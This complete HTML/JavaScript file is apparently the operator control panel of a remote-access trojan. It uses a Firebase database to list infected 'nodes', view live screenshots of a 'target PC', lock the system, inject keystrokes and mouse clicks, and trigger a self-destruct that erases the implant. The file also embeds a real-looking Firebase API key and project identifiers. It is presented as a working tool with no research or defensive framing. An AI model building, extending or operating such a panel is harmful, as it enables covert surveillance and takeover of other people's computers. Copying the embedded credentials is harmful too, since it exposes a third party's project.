<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Device Control Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background: #0b0f1a; color: #e2e8f0; }
        .glass { background: rgba(17, 25, 40, 0.75); backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .device-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        .device-card:hover { transform: translateY(-4px); border-color: #3b82f6; }
        #live-viewport { 
            cursor: crosshair;
            image-rendering: pixelated;
        }
    </style>
</head>
<body class="p-6">

    <div class="max-w-[1600px] mx-auto">
        <header class="flex justify-between items-center mb-8">
            <div>
                <h1 class="text-3xl font-black tracking-tighter text-white">SYSTEM<span class="text-blue-500">X</span> CONTROL</h1>
                <p class="text-slate-500 text-sm">Managing <span id="device-count" class="text-blue-400 font-bold">0</span> Active Nodes</p>
            </div>
            <div id="global-status" class="px-4 py-2 rounded-full glass text-[10px] font-bold flex items-center gap-2">
                <div class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
                FIREBASE LIVE
            </div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            
            <!-- Device Selection Sidebar -->
            <div class="lg:col-span-3 space-y-4 overflow-y-auto max-h-[80vh] pr-2" id="device-list">
                <div class="text-center py-20 opacity-20 italic text-sm">Waiting for devices to ping...</div>
            </div>

            <!-- Control Dashboard -->
            <div class="lg:col-span-9 space-y-6">
                <div id="no-selection" class="glass rounded-3xl h-[60vh] flex flex-col items-center justify-center border-dashed border-2 border-white/5">
                    <div class="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center mb-4">
                        <svg class="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
                    </div>
                    <h2 class="text-lg font-bold text-white">Select a Node</h2>
                    <p class="text-slate-500 text-xs">Choose a device from the sidebar to begin remote session.</p>
                </div>

                <div id="main-controls" class="hidden space-y-6">
                    <!-- Info Header -->
                    <div class="glass p-4 rounded-2xl flex justify-between items-center">
                        <div class="flex items-center gap-4">
                            <span id="active-hostname" class="font-bold text-white uppercase tracking-tight">HOSTNAME</span>
                            <span id="active-id" class="text-[9px] bg-white/5 px-2 py-1 rounded font-mono text-slate-400 tracking-widest uppercase">ID: ----</span>
                        </div>
                        <button onclick="sendDestruct()" class="px-4 py-2 bg-red-600/10 hover:bg-red-600 text-red-500 hover:text-white rounded-lg text-[10px] font-bold transition-all border border-red-500/20">FORCE SELF-DESTRUCT</button>
                    </div>

                    <div class="grid grid-cols-1 xl:grid-cols-4 gap-6">
                        <!-- Viewport -->
                        <div class="xl:col-span-3">
                            <div class="glass p-2 rounded-3xl overflow-hidden relative">
                                <div class="absolute top-6 left-6 z-10 flex items-center gap-2">
                                    <div id="live-indicator" class="w-2 h-2 bg-red-500 rounded-full hidden animate-pulse"></div>
                                    <span id="status-tag" class="text-[9px] font-bold text-white/40 uppercase tracking-widest">Feed Disabled</span>
                                </div>
                                <div class="bg-black rounded-2xl aspect-video flex items-center justify-center overflow-hidden">
                                    <img id="live-viewport" src="" class="max-w-full max-h-full hidden" onmousedown="clickScreen(event)" draggable="false">
                                    <div id="loader" class="text-slate-700 flex flex-col items-center">
                                        <div class="w-8 h-8 border-2 border-white/5 border-t-blue-500 rounded-full animate-spin mb-4"></div>
                                        <span class="text-[9px] font-bold tracking-[0.2em] uppercase">Initializing Feed</span>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Side Tools -->
                        <div class="space-y-4">
                            <div class="glass p-5 rounded-3xl">
                                <h3 class="text-[10px] font-bold text-slate-500 mb-4 uppercase tracking-widest">Main Actions</h3>
                                <div class="grid grid-cols-2 gap-2 mb-4">
                                    <button onclick="toggleCommand('lock')" id="lock-btn" class="py-3 bg-slate-800 hover:bg-red-600 rounded-xl text-[10px] font-bold transition-all">LOCK SYSTEM</button>
                                    <button onclick="toggleCommand('stream')" id="stream-btn" class="py-3 bg-slate-800 hover:bg-blue-600 rounded-xl text-[10px] font-bold transition-all">STREAM FEED</button>
                                </div>
                                <div class="space-y-2">
                                    <input type="text" id="typing-box" placeholder="Remote type..." class="w-full bg-black/40 border border-white/5 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-blue-500/50">
                                    <div class="flex gap-2">
                                        <button onclick="remoteType()" class="flex-1 bg-blue-600 py-3 rounded-xl font-bold text-[10px] uppercase">Send String</button>
                                        <button onclick="sendKey('ENTER')" class="px-4 bg-white/5 rounded-xl hover:bg-white/10 transition-colors">↵</button>
                                    </div>
                                </div>
                            </div>

                            <div class="glass p-5 rounded-3xl">
                                <h3 class="text-[10px] font-bold text-slate-500 mb-4 uppercase tracking-widest">Hotkeys</h3>
                                <div class="grid grid-cols-3 gap-2">
                                    <button onclick="sendKey('WIN')" class="p-2 bg-white/5 hover:bg-white/10 rounded-lg text-[10px] font-bold">WIN</button>
                                    <button onclick="sendKey('ESC')" class="p-2 bg-white/5 hover:bg-white/10 rounded-lg text-[10px] font-bold">ESC</button>
                                    <button onclick="sendKey('F4')" class="p-2 bg-white/5 hover:bg-white/10 rounded-lg text-[10px] font-bold">F4</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Replace with your Firebase credentials
        const firebaseConfig = {
            apiKey: "AIzaSyBcL0G8b7Yt_Ahk29cUaTTfp6Uf4QgNfTI",
            authDomain: "smsyy-f7bb7.firebaseapp.com",
            databaseURL: "https://smsyy-f7bb7-default-rtdb.firebaseio.com",
            projectId: "smsyy-f7bb7",
            storageBucket: "smsyy-f7bb7.firebasestorage.app",
            messagingSenderId: "199149027655",
            appId: "1:199149027655:web:2d9e70e7dff7abc293cc62"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let selectedId = null;

        // Auto-refresh Device List
        db.ref('devices').on('value', (snap) => {
            const devices = snap.val() || {};
            const list = document.getElementById('device-list');
            list.innerHTML = '';
            
            let count = 0;
            Object.keys(devices).forEach(id => {
                count++;
                const dev = devices[id];
                const isOnline = (Date.now() / 1000) - dev.status?.last_seen < 15;
                
                const el = document.createElement('div');
                el.className = `device-card glass p-4 rounded-2xl cursor-pointer ${selectedId === id ? 'border-blue-500 bg-blue-500/10' : ''}`;
                el.onclick = () => selectNode(id, dev.status?.hostname);
                
                el.innerHTML = `
                    <div class="flex items-center gap-3">
                        <div class="w-2.5 h-2.5 rounded-full ${isOnline ? 'bg-emerald-500 shadow-[0_0_8px_rgba(16,185,129,0.5)]' : 'bg-slate-700'}"></div>
                        <div class="flex-1">
                            <h4 class="font-bold text-xs text-white">${dev.status?.hostname || 'Node-X'}</h4>
                            <p class="text-[9px] font-mono text-slate-500">${id}</p>
                        </div>
                        ${dev.commands?.lock ? '<div class="w-1.5 h-1.5 rounded-full bg-red-500"></div>' : ''}
                    </div>
                `;
                list.appendChild(el);
            });
            document.getElementById('device-count').innerText = count;

            if(selectedId && devices[selectedId]) {
                syncUI(devices[selectedId]);
            }
        });

        function selectNode(id, name) {
            selectedId = id;
            document.getElementById('no-selection').classList.add('hidden');
            document.getElementById('main-controls').classList.remove('hidden');
            document.getElementById('active-hostname').innerText = name || 'UNKNOWN';
            document.getElementById('active-id').innerText = `ID: ${id}`;
        }

        function syncUI(data) {
            const lockBtn = document.getElementById('lock-btn');
            const streamBtn = document.getElementById('stream-btn');
            
            // Sync Lock Status
            if(data.commands?.lock) {
                lockBtn.innerText = "UNBLOCK PC";
                lockBtn.classList.replace('bg-slate-800', 'bg-red-600');
            } else {
                lockBtn.innerText = "LOCK SYSTEM";
                lockBtn.classList.replace('bg-red-600', 'bg-slate-800');
            }

            // Sync Stream Status
            if(data.commands?.stream) {
                streamBtn.innerText = "STREAM LIVE";
                streamBtn.classList.replace('bg-slate-800', 'bg-blue-600');
                document.getElementById('live-indicator').classList.remove('hidden');
                document.getElementById('status-tag').innerText = "LIVE FEED";
                document.getElementById('status-tag').classList.replace('text-white/40', 'text-blue-400');
            } else {
                streamBtn.innerText = "STREAM FEED";
                streamBtn.classList.replace('bg-blue-600', 'bg-slate-800');
                document.getElementById('live-indicator').classList.add('hidden');
                document.getElementById('status-tag').innerText = "Feed Disabled";
                document.getElementById('status-tag').classList.replace('text-blue-400', 'text-white/40');
            }

            // Update Image
            if(data.last_screenshot) {
                const img = document.getElementById('live-viewport');
                img.src = data.last_screenshot;
                img.classList.remove('hidden');
                document.getElementById('loader').classList.add('hidden');
            }
        }

        function toggleCommand(cmd) {
            if(!selectedId) return;
            const ref = db.ref(`devices/${selectedId}/commands/${cmd}`);
            ref.once('value', s => ref.set(!s.val()));
        }

        function remoteType() {
            if(!selectedId) return;
            const val = document.getElementById('typing-box').value;
            db.ref(`devices/${selectedId}/commands/typing`).set(val);
            document.getElementById('typing-box').value = "";
            setTimeout(() => db.ref(`devices/${selectedId}/commands/typing`).set(""), 300);
        }

        function sendKey(key) {
            if(!selectedId) return;
            db.ref(`devices/${selectedId}/commands/typing`).set(`{KEY:${key}}`);
            setTimeout(() => db.ref(`devices/${selectedId}/commands/typing`).set(""), 300);
        }

        function clickScreen(e) {
            if(!selectedId) return;
            const img = document.getElementById('live-viewport');
            const rect = img.getBoundingClientRect();
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            db.ref(`devices/${selectedId}/commands/mouse`).set({ x, y, ts: Date.now() });
        }

        function sendDestruct() {
            if(!selectedId) return;
            if(confirm("DANGER: This will delete the software from target PC permanently. Continue?")) {
                db.ref(`devices/${selectedId}/commands/destruct`).set(true);
            }
        }
    </script>
</body>
</html>
